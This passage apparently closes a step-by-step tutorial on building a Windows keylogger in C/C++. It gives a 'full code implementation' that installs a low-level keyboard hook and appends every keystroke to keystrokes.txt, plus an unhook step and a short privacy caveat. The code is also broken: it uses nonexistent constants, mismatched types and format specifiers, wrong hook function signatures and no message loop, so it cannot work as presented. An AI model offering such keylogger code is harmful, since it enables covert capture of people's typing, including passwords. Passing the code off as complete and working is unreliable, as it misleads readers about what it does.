    // Handle key up
    // Optionally, update lastKeystroke if needed
}
```

### Step 7: Cleanup and Unhook
Unhook the keyboard when done:
```c
UnhookWindowsHook(keyboardHook);
```

### Step 8: Full Code Implementation
Putting it all together, here's a complete example:
```c
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <ctime>

using namespace std;

struct Keystroke {
    int key;
    int modifiers;
    int time;
};

HHOOK keyboardHook;
HHOOK keyboardEventHook;

void keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode != HC_ACTION) {
        return;
    }

    if (wParam == VK_KEYDOWN) {
        Keystroke ks;
        ks.key = wParam;
        ks.modifiers = GetKeyState(WHEEL_KEY);
        ks.time = time(nullptr);

        // Store keystroke in a file or database
        // Example: Append to a file
        FILE *file = fopen("keystrokes.txt", "a");
        if (file) {
            fprintf(file, "[%s] Key: %d, Modifiers: %d, Time: %d\n", 
                   to_string(ks.key), ks.modifiers, ks.time);
            fclose(file);
        }
    } else if (wParam == VK_KEYUP) {
        // Optionally handle key release
        // For this example, we'll ignore key releases
    }
    return keyboardEventHook;
}

int main() {
    keyboardEventHook = SetWindowsHook(WH_KEYBOARD_LL, keyboardHookProc);
    if (keyboardEventHook == NULL) {
        cout << "Failed to set keyboard hook" << endl;
        return 1;
    }

    cout << "Keyboard hook initialized. Logging keystrokes to keystrokes.txt" << endl;

    // Keep the program running to monitor the hook
    while (true) {
        Sleep(1);
    }

    // Cleanup
    UnhookWindowsHook(keyboardEventHook);
    cout << "Keyboard hook removed." << endl;
    return 0;
}
```

### Note:
- **Permissions**: Ensure the program runs with sufficient privileges. You might need to run it as an administrator or include a manifest to request necessary permissions.
- **Performance**: The hook might consume resources, so monitor its performance if used in real applications.
- **Privacy**: Be cautious with the data collected and ensure compliance with local laws and policies when logging keystrokes.

